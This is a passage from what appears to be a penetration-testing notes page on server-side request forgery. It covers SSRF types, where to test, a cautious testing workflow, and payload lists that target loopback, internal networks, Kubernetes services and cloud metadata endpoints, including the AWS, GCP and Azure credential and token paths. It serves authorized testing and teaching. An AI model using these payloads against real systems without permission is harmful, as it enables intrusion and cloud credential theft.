+<li><a href="https://portswigger.net/web-security/ssrf">PortSwigger SSRF</a></li>
+<li><a href="https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html">HackTricks SSRF</a></li>
+<li><a href="https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html">HackTricks URL Format Bypass</a></li>
+<li><a href="https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html">HackTricks Cloud SSRF</a></li>
+<li><a href="https://notes.incendium.rocks/pentesting-notes/web/ssrf">Incendium SSRF Notes</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery">OWASP WSTG SSRF Testing</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP SSRF Prevention Cheat Sheet</a></li>
+<li><a href="https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">OWASP Top 10 A10:2021 SSRF</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">PayloadsAllTheThings SSRF</a></li>
+</ul>
+<hr />
+<h2 id="basics">Basics</h2>
+<p>Most SSRF testing is about answering five questions:</p>
+<ol>
+<li>
+<p><strong>Can I control a destination?</strong>
+   Example: full URL, hostname, path, image URL, webhook URL, import URL.</p>
+</li>
+<li>
+<p><strong>Does the server make the request?</strong>
+   Confirm with a unique external listener such as Burp Collaborator, interactsh, webhook.site, requestrepo, or Canarytokens.</p>
+</li>
+<li>
+<p><strong>Can I see the response?</strong>
+   If yes, it is in-band SSRF. If no, it may still be blind SSRF.</p>
+</li>
+<li>
+<p><strong>Where can the server reach from its network position?</strong>
+   Loopback, private RFC1918 ranges, link-local metadata, service mesh, Kubernetes, internal APIs, admin panels.</p>
+</li>
+<li>
+<p><strong>Can I bypass validation?</strong>
+   Test parser confusion, redirects, DNS tricks, encoded IPs, alternative schemes, URL fragments, userinfo, and allowlist mistakes.</p>
+</li>
+</ol>
+<p>A vulnerable flow often looks like this:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>User submits:
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>    stockApi=http://example.com/api/stock?id=1
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Server does:
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>    GET http://example.com/api/stock?id=1
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>Attacker changes it to:
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>    stockApi=http://127.0.0.1/admin
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>Server does:
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>    GET http://127.0.0.1/admin
+</span></code></pre></div>
+<hr />
+<h2 id="main-ssrf-types">Main SSRF Types</h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Meaning</th>
+<th>Typical signal</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>In-band SSRF</td>
+<td>Backend response is returned to the attacker.</td>
+<td>Internal page, JSON, error, banner, metadata appears in the response.</td>
+</tr>
+<tr>
+<td>Blind SSRF</td>
+<td>Server makes the request, but response is not returned.</td>
+<td>DNS/HTTP callback to Collaborator/interactsh/webhook.site.</td>
+</tr>
+<tr>
+<td>Semi-blind SSRF</td>
+<td>No body is returned, but status, length, timing, or error changes.</td>
+<td>Different response time, status code, redirect, or exception.</td>
+</tr>
+<tr>
+<td>Localhost SSRF</td>
+<td>Server connects to itself through loopback.</td>
+<td><code>127.0.0.1</code>, <code>localhost</code>, <code>[::1]</code>, <code>0</code>, <code>127.1</code>.</td>
+</tr>
+<tr>
+<td>Internal network SSRF</td>
+<td>Server reaches RFC1918/private services.</td>
+<td><code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>.</td>
+</tr>
+<tr>
+<td>Cloud metadata SSRF</td>
+<td>Server reaches cloud instance metadata service.</td>
+<td><code>169.254.169.254</code>, <code>metadata.google.internal</code>, Azure/GCP/AWS metadata.</td>
+</tr>
+<tr>
+<td>Protocol SSRF</td>
+<td>Fetcher supports non-HTTP schemes.</td>
+<td><code>file://</code>, <code>gopher://</code>, <code>dict://</code>, <code>ftp://</code>, <code>ldap://</code>, <code>sftp://</code>.</td>
+</tr>
+<tr>
+<td>Parser confusion SSRF</td>
+<td>Validator and HTTP client parse the URL differently.</td>
+<td><code>@</code>, <code>#</code>, backslashes, encoded characters, nested domains.</td>
+</tr>
+<tr>
+<td>Second-order SSRF</td>
+<td>Payload is stored first and fetched later.</td>
+<td>Profile images, invoices, PDF exports, admin previews, webhooks.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="where-to-test">Where to Test</h2>
+<p>Test every place where user-controlled input may become a server-side request.</p>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>URL query parameters</td>
+<td><code>?url=</code>, <code>?next=</code>, <code>?redirect=</code>, <code>?image=</code>, <code>?callback=</code>, <code>?feed=</code></td>
+</tr>
+<tr>
+<td>POST form fields</td>
+<td>avatar URL, website URL, import URL, stock API, webhook target</td>
+</tr>
+<tr>
+<td>JSON body</td>
+<td><code>{ "url": "https://example.com" }</code></td>
+</tr>
+<tr>
+<td>GraphQL variables</td>
+<td>image importers, link previews, integrations</td>
+</tr>
+<tr>
+<td>Multipart fields</td>
+<td>file metadata, remote file import, image upload by URL</td>
+</tr>
+<tr>
+<td>Headers</td>
+<td><code>Host</code>, <code>Referer</code>, <code>X-Forwarded-Host</code>, <code>X-Original-URL</code>, custom webhook headers</td>
+</tr>
+<tr>
+<td>XML/SVG/HTML input</td>
+<td>XXE, external images, CSS <code>url()</code>, SVG external references</td>
+</tr>
+<tr>
+<td>Markdown/HTML renderers</td>
+<td>image fetches, link previews, Open Graph preview generation</td>
+</tr>
+<tr>
+<td>PDF generators</td>
+<td><code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;link rel="stylesheet"&gt;</code>, CSS <code>url()</code></td>
+</tr>
+<tr>
+<td>Webhook integrations</td>
+<td>Slack/Discord/webhook tester URLs</td>
+</tr>
+<tr>
+<td>OAuth/SAML/OIDC fields</td>
+<td><code>redirect_uri</code>, <code>jwks_uri</code>, metadata URL, discovery URL</td>
+</tr>
+<tr>
+<td>API clients</td>
+<td>OpenAPI import, Postman collection import, Swagger URL import</td>
+</tr>
+<tr>
+<td>Admin panels</td>
+<td>integrations, notification URLs, monitoring targets</td>
+</tr>
+<tr>
+<td>Background jobs</td>
+<td>reports, invoices, crawlers, screenshot services</td>
+</tr>
+</tbody>
+</table>
+<p>High-value parameter names:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>url
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>uri
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>path
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>dest
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>destination
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>redirect
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>redirect_url
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>next
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>return
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>returnUrl
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>callback
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>callback_url
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>webhook
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>webhook_url
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>image
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>image_url
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>avatar
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>avatar_url
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>file
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>file_url
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>document
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>feed
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>feed_url
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>rss
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>api
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>api_url
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>stockApi
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>host
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>hostname
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>domain
+</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>site
+</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>website
+</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a>endpoint
+</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>proxy
+</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a>target
+</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a>link
+</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a>preview
+</span><span id="__span-2-38"><a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a>template
+</span><span id="__span-2-39"><a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a>reference
+</span></code></pre></div>
+<hr />
+<h2 id="safe-testing-workflow">Safe Testing Workflow</h2>
+<ol>
+<li>Confirm scope and authorization.</li>
+<li>Capture a baseline request and response.</li>
+<li>Change only one parameter at a time.</li>
+<li>Use a unique marker in every payload, for example:</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ssrf-probe-73921
+</span></code></pre></div>
+<ol>
+<li>Start with your own external listener before testing internal addresses:</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>http://ssrf-probe-73921.your-oast-domain.example/ping
+</span></code></pre></div>
+<ol>
+<li>
+<p>Check whether the listener receives:</p>
+</li>
+<li>
+<p>DNS lookup</p>
+</li>
+<li>HTTP request</li>
+<li>HTTPS request</li>
+<li>source IP</li>
+<li>User-Agent</li>
+<li>headers</li>
+<li>
+<p>path and query string</p>
+</li>
+<li>
+<p>Test harmless internal endpoints first:</p>
+</li>
+<li>
+<p><code>/</code></p>
+</li>
+<li><code>/health</code></li>
+<li><code>/status</code></li>
+<li><code>/robots.txt</code></li>
+<li>
+<p><code>/favicon.ico</code></p>
+</li>
+<li>
+<p>Compare:</p>
+</li>
+<li>
+<p>HTTP status code</p>
+</li>
+<li>response length</li>
+<li>page content</li>
+<li>redirect behavior</li>
+<li>error message</li>
+<li>timing</li>
+<li>DNS-only callbacks</li>
+<li>
+<p>HTTP callbacks</p>
+</li>
+<li>
+<p>Avoid destructive actions:</p>
+</li>
+<li>
+<p>no broad internal scanning unless allowed</p>
+</li>
+<li>no POST/PUT/DELETE to internal services unless explicitly allowed</li>
+<li>no cloud credential use outside the rules of engagement</li>
+<li>
+<p>no high-concurrency time-based scanning on production</p>
+</li>
+<li>
+<p>Prove impact with minimal evidence, not full data extraction.</p>
+</li>
+</ol>
+<hr />
+<h2 id="first-probe-payloads">First Probe Payloads</h2>
+<p>Start with controlled external callbacks.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>http://ssrf-probe-73921.oast.example/
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>https://ssrf-probe-73921.oast.example/
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>http://ssrf-probe-73921.oast.example/path?source=stockApi
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>https://ssrf-probe-73921.oast.example/ssrf-test
+</span></code></pre></div>
+<p>Try different schemes if allowed:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>http://
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>https://
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>ftp://
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>file://
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>gopher://
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>dict://
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>ldap://
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>sftp://
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>tftp://
+</span></code></pre></div>
+<p>Good confirmation signals:</p>
+<ul>
+<li>your OAST server receives DNS only</li>
+<li>your OAST server receives HTTP request</li>
+<li>the backend response is reflected</li>
+<li>application error contains connection details</li>
+<li>request time changes</li>
+<li>status code changes</li>
+<li>backend fetcher User-Agent appears</li>
+<li>application follows redirects to your second URL</li>
+<li>SSRF source IP belongs to cloud, container, NAT, or internal infrastructure</li>
+</ul>
+<hr />
+<h2 id="basic-localhost-payloads">Basic Localhost Payloads</h2>
+<p>Try common loopback forms:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>http://127.0.0.1/
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>http://127.0.0.1:80/
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>http://127.0.0.1:443/
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>http://127.0.0.1:8080/
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>http://localhost/
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>http://localhost:8080/
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>http://127.1/
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>http://0/
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>http://0.0.0.0/
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>http://[::1]/
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>http://[0000::1]/
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>http://[0:0:0:0:0:ffff:127.0.0.1]/
+</span></code></pre></div>
+<p>Useful loopback ports to check carefully:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>22      SSH banner only, usually no HTTP response
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>25      SMTP
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>80      HTTP
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>443     HTTPS
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>5000    Flask / development APIs
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>5601    Kibana
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>8000    development servers
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>8080    proxy/admin/dev app
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>8081    alternative web app
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>8443    HTTPS admin app
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>9000    PHP-FPM / app service / SonarQube depending on context
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>9200    Elasticsearch
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>2375    Docker API, very sensitive
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>10250   Kubernetes kubelet, very sensitive
+</span></code></pre></div>
+<p>Do not perform destructive requests against sensitive internal services.</p>
+<hr />
+<h2 id="internal-network-payloads">Internal Network Payloads</h2>
+<p>Common RFC1918/private network targets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>http://10.0.0.1/
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>http://10.10.10.10/
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>http://172.16.0.1/
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>http://172.17.0.1/
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>http://172.18.0.1/
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>http://192.168.0.1/
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>http://192.168.1.1/
+</span></code></pre></div>
+<p>Container and Kubernetes environments often expose interesting local networks:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>http://172.17.0.1/
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>http://10.96.0.1/
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>https://kubernetes.default.svc/
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>https://kubernetes.default.svc.cluster.local/
+</span></code></pre></div>
+<p>Service discovery names worth testing only in authorized environments:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>http://localhost/
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>http://admin/
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>http://api/
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>http://internal/
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>http://backend/
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>http://gateway/
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>http://consul.service.consul/
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>http://vault.service.consul/
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>http://kubernetes.default.svc/
+</span></code></pre></div>
+<hr />
+<h2 id="cloud-metadata-ssrf">Cloud Metadata SSRF</h2>
+<p>Cloud metadata SSRF is one of the highest-impact SSRF classes. Metadata endpoints are normally reachable only from inside the instance or workload.</p>
+<h3 id="aws-ec2-metadata">AWS EC2 Metadata</h3>
+<p>Base endpoint:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>http://169.254.169.254/
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>http://169.254.169.254/latest/meta-data/
+</span></code></pre></div>
+<p>Common low-impact discovery endpoints:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>http://169.254.169.254/latest/meta-data/ami-id
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>http://169.254.169.254/latest/meta-data/instance-id
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>http://169.254.169.254/latest/meta-data/instance-type
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>http://169.254.169.254/latest/meta-data/placement/region
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>http://169.254.169.254/latest/dynamic/instance-identity/document
+</span></code></pre></div>
+<p>IAM role discovery:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>http://169.254.169.254/latest/meta-data/iam/
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>http://169.254.169.254/latest/meta-data/iam/info
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span></code></pre></div>
+<p>AWS IMDSv2 requires a token obtained with a <code>PUT</code> request and then reused in the <code>X-aws-ec2-metadata-token</code> header. This makes exploitation harder when the SSRF primitive can only send simple GET requests.</p>
+<h3 id="aws-ecs-containers">AWS ECS / Containers</h3>
+<p>ECS task credentials often use:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>http://169.254.170.2/v2/credentials/&lt;GUID&gt;
+</span></code></pre></div>
+<p>The path may be stored in:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+</span></code></pre></div>
+<p>If an SSRF is combined with local file read, <code>/proc/self/environ</code> may expose useful environment variables. Treat this as high impact.</p>
+<h3 id="gcp-metadata">GCP Metadata</h3>
+<p>GCP metadata usually requires this header:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Metadata-Flavor: Google
+</span></code></pre></div>
+<p>Base endpoints:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>http://metadata.google.internal/
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>http://metadata/
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>http://169.254.169.254/
+</span></code></pre></div>
+<p>Common discovery endpoints:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>http://metadata.google.internal/computeMetadata/v1/project/project-id
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>http://metadata.google.internal/computeMetadata/v1/instance/name
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>http://metadata.google.internal/computeMetadata/v1/instance/hostname
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>http://metadata.google.internal/computeMetadata/v1/instance/zone
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+</span></code></pre></div>
+<p>Service account token endpoint:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+</span></code></pre></div>
+<h3 id="azure-metadata">Azure Metadata</h3>
+<p>Azure metadata usually requires this header:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Metadata: true
+</span></code></pre></div>
+<p>Base endpoint:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>http://169.254.169.254/metadata/instance?api-version=2021-02-01
+</span></code></pre></div>
+<p>Managed identity token endpoint shape:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=&lt;resource&gt;
+</span></code></pre></div>
+<p>Azure metadata requests must not include <code>X-Forwarded-For</code>.</p>
+<h3 id="cloud-testing">Cloud Testing</h3>
+<p>For cloud SSRF proof, prefer minimal evidence first:</p>
